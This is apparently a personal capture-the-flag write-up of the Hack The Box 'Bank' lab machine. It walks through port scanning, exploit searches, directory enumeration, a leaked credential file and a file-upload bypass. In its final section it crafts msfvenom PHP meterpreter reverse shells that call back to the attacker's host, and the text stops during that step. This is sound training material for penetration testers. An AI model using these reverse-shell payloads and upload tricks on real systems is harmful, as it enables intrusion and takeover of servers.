# References
1. [Bank Writeup (mrsaighnal.github.io)](https://mrsaighnal.github.io/2019-04-26-bank-walkthrough/)
2. [Bank Writeup (medium.com)](https://medium.com/@johnsonmatt/hackthebox-bank-walkthrough-8b637ec6a0df)

# Summary
### 1. NMAP

### 2. Enumeration

### 3. Attacking Port 80 Apache 2.4.7

### 4. Attacking Port 22 OpenSSH 6.6.1p1

### 5. Further Enumeration with Dirbuster

### 6. Host Configuration

### 7. Further Enumeration with Dirbuster Again

### 8. Exploitating Unencrypted Credentials

### 9. PHP Payload

### 10. Privilege Escalation & Getting Flags

# Attack
## 1. NMAP
This machine sounds fun. Let's go.
```
hippoeug@kali:~$ nmap -sC -sV 10.10.10.29 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 22:42 +08
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain?
80/tcp open  http    Apache/2.4.7 (Ubuntu)
|_http-server-header: Apache/2.4.7 (Ubuntu)                                                                                                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```
Ooh, a Linux machine. SSH, mystery port, and HTTP!

Let's do the obligatory vuln script too.
```
hippoeug@kali:~$ nmap --script vuln 10.10.10.29 -Pn -v
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-26 22:44 +08
...
PORT   STATE SERVICE
22/tcp open  ssh
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
53/tcp open  domain
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack                                                                                                                                              
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
...
```

## 2. Enumeration
Let's visit the webpage. Navigating to `http://10.10.10.29:80` on our browser, we see the Apache2 Ubuntu Default Page.

Time to find exploits! Let's see `apache 2.4.7` first.
```
hippoeug@kali:~$ searchsploit apache 2.4.7
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                     | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                   | php/remote/29316.py
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                     | php/remote/40142.php
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                        | linux/dos/34133.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                    | linux/webapps/42745.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                 | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                          | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                          | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                 | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                   | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                 | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                           | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                        | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                        | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                        | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                    | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Many exploits, let's KIV and try some.

While we're at it, let's look at `openssh 6.6.1` as well.
```
hippoeug@kali:~$ searchsploit openssh 6.6.1
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                            | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                      | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                            | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                | linux/remote/45939.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

hippoeug@kali:~$ searchsploit 2ubuntu
Exploits: No Results
Shellcodes: No Results
```
Interesting, couple exploits to KIV too.

## 3. Attacking Port 80 Apache 2.4.7
Googling for "apache 2.4.7 exploit", we don't see anything obvious that we could try. This is unusual, when compared to the previous exercises we have done so far.

Regardless, we will try a few from the Searchsploit searches. Let's try the `Remote Code Execution + Scanner` for `Apache + PHP`, even though we may not have PHP.
```
hippoeug@kali:~$ searchsploit -m 29316.py
  Exploit: Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner
      URL: https://www.exploit-db.com/exploits/29316
     Path: /usr/share/exploitdb/exploits/php/remote/29316.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/29316.py

hippoeug@kali:~$ python 29316.py
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
usage: 

  ./ap-unlock-v1337.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]
  ./ap-unlock-v1337.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]

0pt1ons:

  -h wh1t3h4tz.0rg     | t3st s1ngle h0st f0r vu1n
  -p 80                | t4rg3t p0rt (d3fau1t: 80)
  -S                   | c0nn3ct thr0ugh ss1
  -c 'uname -a;id'     | s3nd c0mm4nds t0 h0st
  -x 192.168.0.2:1337  | c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll
  -s                   | t3st s1ngl3 h0st f0r vu1n
  -r 133.1.3-7.7-37    | sc4nz iP addr3ss r4ng3 f0r vu1n
  -R 1337              | sc4nz num r4nd0m h0st5 f0r vu1n
  -t 2                 | c0nn3ct t1me0ut in s3x (d3fau1t: 3)
  -T 2                 | r3ad t1me0ut in s3x (d3fau1t: 3)
  -f vu1n.lst          | wr1t3 vu1n h0sts t0 f1l3
  -i sc4nz.lst         | sc4nz h0sts fr0m f1le f0r vu1n
  -v                   | pr1nt m0ah 1nf0z wh1l3 sh1tt1ng
hippoeug@kali:~$ python 29316.py -h 10.129.29.200 -s -x 10.10.x.x:4444
--==[ ap-unlock-v1337.py by noptrix@nullsecurity.net ]==--
[+] sc4nn1ng s1ngl3 h0st 10.129.29.200 
[+] h0p3 1t h3lp3d
```
This weird thing didn't h3lp3d at all, was d1ss4p01n+ing..

Let's give another one a shot, this time `JSP Upload Bypass / Remote Code Execution (2)` for `Apache Tomcat`, even though we may not have Tomcat.
```
hippoeug@kali:~$ searchsploit -m 42966.py
  Exploit: Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/42966
     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/hippoeug/42966.py

hippoeug@kali:~$ python 42966.py

                                                                                                                                                                      
                                                                                                                                                                      
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
./cve-2017-12617.py [options]                                                                                                                                         
                                                                                                                                                                      
options:                                                                                                                                                              
                                                                                                                                                                      
-u ,--url [::] check target url if it's vulnerable                                                                                                                    
-p,--pwn  [::] generate webshell and upload it                                                                                                                        
-l,--list [::] hosts list                                                                                                                                             
                                                                                                                                                                      
[+]usage:                                                                                                                                                             
                                                                                                                                                                      
./cve-2017-12617.py -u http://127.0.0.1                                                                                                                               
./cve-2017-12617.py --url http://127.0.0.1                                                                                                                            
./cve-2017-12617.py -u http://127.0.0.1 -p pwn                                                                                                                        
./cve-2017-12617.py --url http://127.0.0.1 -pwn pwn                                                                                                                   
./cve-2017-12617.py -l hotsts.txt                                                                                                                                     
./cve-2017-12617.py --list hosts.txt                                                                                                                                  
                                                                                                                                                                      
                                                                                                                                                                      
[@intx0x80]

hippoeug@kali:~$ python 42966.py -u http://10.129.29.200

                                                                                                                                                                      
                                                                                                                                                                      
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______                                                                                            
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |                                                                                           
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /                                                                                            
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /                                                                                             
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /                                                                                              
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/                                                                                               
                                                                                                                                                                      
                                                                                                                                                                      
                                                                                                                                                                      
[@intx0x80]                                                                                                                                                           
                                                                                                                                                                      
                                                                                                                                                                      
Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617 
```
Nope, not vulnerable. Let's move on to find another way in.

## 4. Attacking Port 22 OpenSSH 6.6.1p1
Googling for "openssh 6.6.1 exploit", we don't see anything obvious that we could either.

Hence let's just get our hands dirty. We will try both `Username Enumeration` exploits.
```
hippoeug@kali:~$ python 45233.py
/home/hippoeug/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
Traceback (most recent call last):
  File "45233.py", line 30, in <module>
    old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
TypeError: 'property' object has no attribute '__getitem__'

hippoeug@kali:~$ python 45210.py
/home/hippoeug/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
Traceback (most recent call last):
  File "45210.py", line 40, in <module>
    paramiko.common.MSG_SERVICE_ACCEPT]
TypeError: 'property' object has no attribute '__getitem__'
```
Both of them showed errors. 

Since none of these exploits worked so far, we shall do Dirbuster!

## 5. Further Enumeration with Dirbuster
As we've done so in the [Beep](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Beep.md) exercise, we will use Gobuster and Dirbuster.

Gobuster first, as with tradition.
```
hippoeug@kali:~$ gobuster dir -u "http://10.129.41.103:80" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.129.41.103:80
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/31 04:27:05 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2021/01/31 04:36:53 Finished
===============================================================
```
What the.. only 1 directory detected.

Let's now use Dirbuster.
```
hippoeug@kali:~$ dirbuster
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: / - 200
Dir found: /icons/ - 403
Dir found: /icons/small/ - 403
Dir found: /server-status/ - 403
DirBuster Stopped
```
What is going on!! I needed to look online for clues.

After reading some walkthroughs, there was something that needed to be done. We had to add the domain into our `/etc/hosts` file.

## 6. Host Configuration
It turns out there is something called ["Virtual Hosts"](https://www.freeparking.co.nz/learning-hub/wiki/what-is-virtual-hosting) in Apache, allowing for multiple domain names to be hosted on a single server. Using the right domain name would allow us to connect to the web application.

Let's configure our `/etc/hosts` file.
```
hippoeug@kali:~$ sudo nano /etc/hosts
hippoeug@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.41.103 bank.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
After adding this, we open our browser to "bank.htb" and get directed to "bank.htb/login.php", presenting a login page this time around.

## 7. Further Enumeration with Dirbuster Again
Let's run GoBuster first.
```
hippoeug@kali:~$ gobuster dir -u "http://bank.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bank.htb
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/31 15:10:21 Starting gobuster
===============================================================
/uploads (Status: 301)
/assets (Status: 301)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/article: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/links: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/spacer: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/02: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/privacy: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/11: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/help: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/articles: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/events: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/logo: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/new: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
...
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/misc: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/24: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/19: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/partners: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/2007: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/26: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/top: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/23: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/terms: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/i: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/17: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/27: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/legal: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2021/01/31 15:10:32 [!] Get http://bank.htb/30: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
===============================================================
2021/01/31 15:20:10 Finished
===============================================================
```
Interesting. We now know there are `/uploads`, `/assets`, `/inc`, `/server-status`, as well as `/balance-transfer`.

Now going to our browser, we are going to try each one of these extensions.
```
http://bank.htb/uploads/
-> Forbidden
You don't have permission to access /uploads/ on this server.
Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80

http://bank.htb/assets/
-> Index of /assets
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[DIR]	css/	2021-01-11 14:18 	- 	 
[DIR]	font-awesome/	2021-01-11 14:18 	- 	 
[DIR]	fonts/	2021-01-11 14:18 	- 	 
[DIR]	img/	2021-01-11 14:18 	- 	 
[DIR]	js/	2021-01-11 14:18 	- 	 
Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80

http://bank.htb/inc/
-> Index of /inc
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	footer.php	2017-05-28 20:54 	1.2K	 
[ ]	header.php	2017-05-28 20:53 	2.8K	 
[ ]	ticket.php	2017-05-29 13:16 	2.3K	 
[ ]	user.php	2017-05-28 21:39 	2.8K	 
Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80

http://bank.htb/server-status/
-> Forbidden
You don't have permission to access /server-status/ on this server.
Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80

http://bank.htb/balance-transfer
-> Index of /balance-transfer
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	0a0b2b566c723fce6c5dc9544d426688.acc	2017-06-15 09:50 	583 	 
[ ]	0a0bc61850b221f20d9f356913fe0fe7.acc	2017-06-15 09:50 	585 	 
[ ]	0a2f19f03367b83c54549e81edc2dd06.acc	2017-06-15 09:50 	584 	 
[ ]	0a629f4d2a830c2ca6a744f6bab23707.acc	2017-06-15 09:50 	584 	 
[ ]	0a9014d0cc1912d4bd93264466fd1fad.acc	2017-06-15 09:50 	584 	 
[ ]	0ab1b48c05d1dbc484238cfb9e9267de.acc	2017-06-15 09:50 	585 	 
[ ]	0abe2e8e5fa6e58cd9ce13037ff0e29b.acc	2017-06-15 09:50 	583 	 
[ ]	0b6ad026ef67069a09e383501f47bfee.acc	2017-06-15 09:50 	585 	 
[ ]	0b59b6f62b0bf2fb3c5a21ca83b79d0f.acc	2017-06-15 09:50 	584 	 
[ ]	0b45913c924082d2c88a804a643a29c8.acc	2017-06-15 09:50 	584 	 
[ ]	0be866bee5b0b4cff0e5beeaa5605b2e.acc	2017-06-15 09:50 	584 	 
[ ]	0c04ca2346c45c28ecededb1cf62de4b.acc	2017-06-15 09:50 	585 	 
[ ]	0c4c9639defcfe73f6ce86a17f830ec0.acc	2017-06-15 09:50 	584 	  
... 
[ ]	39095d3e086eb29355d37ed5d19a9ed0.acc	2017-06-15 09:50 	583 	 
[ ]	42261debb6bdfc4d709d424616bc18cc.acc	2017-06-15 09:50 	583 	 
[ ]	44987d36fe627d12501b25116c242318.acc	2017-06-15 09:50 	584 	 
[ ]	45028a24c0a30864f94db632bca0a351.acc	2017-06-15 09:50 	585 	 
[ ]	47171c38422e049e50532e6606fa932d.acc	2017-06-15 09:50 	584 	 
[ ]	49206d1e18aa8eb1c64dae4741639b2f.acc	2017-06-15 09:50 	585 	 
[ ]	50276beac1f014b64b19dbd0e7c6bb1a.acc	2017-06-15 09:50 	584 	 
[ ]	54656a84fec49d5da07f25ee36b298bd.acc	2017-06-15 09:50 	584 	 
[ ]	56215edb6917e27802904037da00a977.acc	2017-06-15 09:50 	584 	 
[ ]	59829e0910101366d704a85f11cfdd15.acc	2017-06-15 09:50 	584 	 
[ ]	66284d79b5caa9e6a3dd440607b3fdd7.acc	2017-06-15 09:50 	584 	 
[ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 
[ ]	75942bd27ec22afd9bdc8826cc454c75.acc	2017-06-15 09:50 	584 	 
[ ]	76123b5b589514bc2cb1c6adfb937d13.acc	2017-06-15 09:50 	584 	 
[ ]	80416d8aaea6d6cf3dcec95780fda17d.acc	2017-06-15 09:50 	585 	 
[ ]	85006f1266226e84efb919908d5f8333.acc	2017-06-15 09:50 	583 	 
[ ]	87831b753b8530fddc74e73ca8515a50.acc	2017-06-15 09:50 	585 	 
[ ]	91249b887c7bf3f6cb7becc0c0ab8ddd.acc	2017-06-15 09:50 	584 	 
[ ]	94290d34dec7593ce7c5632150a063d2.acc	2017-06-15 09:50 	585 	 
[ ]	301120b456a3b5981f5cdc9d484f1b3b.acc	2017-06-15 09:50 	585 	 
[ ]	430547d637347d0da78509b774bb9fdf.acc	2017-06-15 09:50 	584 	 
[ ]	453500e8ebb7e50f098068d998db0090.acc	2017-06-15 09:50 	583 	 
[ ]	632416bbd8eb4a3480297ea3875ea568.acc	2017-06-15 09:50 	584 	 
[ ]	640087eae263bd45eb444767ead7dd65.acc	2017-06-15 09:50 	585 	 
[ ]	756431ad587f462168df5064b3b829a8.acc	2017-06-15 09:50 	584 	 
[ ]	874792fab530aed50b38b26f2a8c1870.acc	2017-06-15 09:50 	584
...
[ ]	fcb78e263fc7d6e296494e5be897a394.acc	2017-06-15 09:50 	584 	 
[ ]	fdce9437d341e154702af5863bc247a8.acc	2017-06-15 09:50 	585 	 
[ ]	fe8a8b0081b6d606d6e85501064f1cc4.acc	2017-06-15 09:50 	585 	 
[ ]	fe9ffc658690f0452cd08ab6775e62da.acc	2017-06-15 09:50 	582 	 
[ ]	fe85ff58d546f676f0acd7558e19d6ce.acc	2017-06-15 09:50 	584 	 
[ ]	fe426e8d4c7453a99ef7cd99cf72ac03.acc	2017-06-15 09:50 	584 	 
[ ]	feac7aa0f309d8c6fa2ff2f624d2914b.acc	2017-06-15 09:50 	584 	 
[ ]	fed62d2afc2793ac001a36f0092977d7.acc	2017-06-15 09:50 	584 	 
[ ]	fedae4fd371fa7d7d4ba5c772e84d726.acc	2017-06-15 09:50 	585 	 
[ ]	ff8a6012cf9c0b6e5957c2cc32edd0bf.acc	2017-06-15 09:50 	585 	 
[ ]	ff39f4cf429a1daf5958998a7899f3ec.acc	2017-06-15 09:50 	584 	 
[ ]	ffc3cab8b54397a12ca83d7322c016d4.acc	2017-06-15 09:50 	584 	 
[ ]	ffdfb3dbd8a9947b21f79ad52c6ce455.acc	2017-06-15 09:50 	584 	 
Apache/2.4.7 (Ubuntu) Server at bank.htb Port 80
```
Wow, there are so many files in `http://bank.htb/balance-transfer`.

Let's inspect 1 file for example and see what we get.
```
http://bank.htb/balance-transfer/0a0b2b566c723fce6c5dc9544d426688.acc

++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
```
Now, this is interesting. Encrypted credentials.

## 8. Exploitating Unencrypted Credentials
I got lost here yet again, and had to look up for writeups again.

Turns out, one of these files is not like the other. Instead of having a size of either 583 or 584, it is much smaller and has a size of 257 due to failed encryption.
```
[ ]	68576f20e9732f1b2edc4df5b8533230.acc	2017-06-15 09:50 	257 	 

http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```
We shall use these credentials to log in to `http://bank.htb/login.php`.

Upon logging in successfully, we can see his balance, transactions, and credit cards. More importantly, we are able to see a Support page which we can upload files. However, since we were unable to access `http://bank.htb/uploads/`, it'd be useless since we would not be able to execute our payload.

Yet again, I am lost since this is the first exercise where we do not use known exploits.

## 9. PHP Payload
The clue was to look at the page source of the support page.
```

<!DOCTYPE html>
<html>
  <head>
    <title>HTB Bank - Support</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Bootstrap -->
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <!-- styles -->
    <link href="./assets/css/theme/styles.css" rel="stylesheet">
    <!-- SweetAlert -->
    <link rel="stylesheet" type="text/css" href="./assets/css/sweetalert.css">
  </head>
  <body>
...

        <div class="panel-body">
            <form class="new_ticket" id="new_ticket" accept-charset="UTF-8" method="post" enctype="multipart/form-data">

                <label>Title</label>
                <input required placeholder="Title" class="form-control" type="text" name="title" id="ticket_title" style="background-repeat: repeat; background-image: none; background-position: 0% 0%;">
                <br>

                <label>Message</label>
                <textarea required placeholder="Tell us your problem" class="form-control" style="height: 170px; background-repeat: repeat; background-image: none; background-position: 0% 0%;" name="message" id="ticket_message"></textarea>
                <br>
                <div style="position:relative;">
                		<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
				        <a class='btn btn-primary' href='javascript:;'>
				            Choose File...
				            <input type="file" required style='position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";opacity:0;background-color:transparent;color:transparent;' name="fileToUpload" size="40"  onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>
				        </a>
				        &nbsp;
				        <span class='label label-info' id="upload-file-info"></span>
...
    <!-- Morris Charts JavaScript -->
    <script src="./assets/js/plugins/morris/raphael.min.js"></script>
    <script src="./assets/js/plugins/morris/morris.min.js"></script>
    <script src="./assets/js/plugins/morris/morris-data.js"></script>

    <!-- SweetAlert -->
    <script src="./assets/js/sweetalert.min.js"></script>

</body>

</html>
```
We spot an interesting comment that the Developer failed to remove! `<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->`, & `onchange='$("#upload-file-info").html($(this).val().replace("C:\\fakepath\\", ""));'>`. This just confirms that we could possibly go to a path and execute our PHP payload.

Let's use msfvenom to craft a PHP reverse shell!
```
hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6969 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 30687 bytes
```
And we go back to our Support page, attaching our `shell.php` PHP reverse shell and submitting it. Unfortunately it returned with the error "You cant upload this file. You can upload only images.". If we read the Developer's comments carefully, we realise that the file extension `.htb` is supported instead for debugging purposes.

Let's use msfvenom again to craft a PHP reverse shell, but using a HTB wrapper.
```
hippoeug@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.x.x LPORT=6969 -f raw > shell.htb
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
